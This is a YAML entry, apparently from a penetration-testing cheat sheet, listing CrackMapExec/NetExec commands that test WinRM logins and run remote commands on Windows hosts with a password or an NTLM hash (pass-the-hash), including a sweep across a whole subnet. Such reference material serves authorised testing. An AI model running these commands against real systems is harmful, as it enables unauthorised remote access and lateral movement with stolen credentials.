---
description: |
  Check WinRM access and execute commands across multiple hosts
  using CrackMapExec/NetExec.

  Reference values:
    Target IP: 10.10.10.1
    Username: john
    Password: password123
command: |
  # Check WinRM access
  crackmapexec winrm 10.10.10.1 -u john -p 'password123'

  # Execute command
  crackmapexec winrm 10.10.10.1 -u john -p 'password123' -x "whoami"

  # With hash
  crackmapexec winrm 10.10.10.1 -u john -H aad3b435b51404eeaad3b435b51404ee -x "whoami"

  # Across a subnet
  crackmapexec winrm 10.10.10.0/24 -u john -p 'password123'
phase:
  - Enumeration
  - Lateral_Movement
target_os:
  - Windows
services:
  - WinRM
items:
  - Username
  - Password
  - Hash
techniques:
  - Pass-the-Hash_Ticket
network_position:
  - Internal
references:
  - https://github.com/Pennyw0rth/NetExec
---
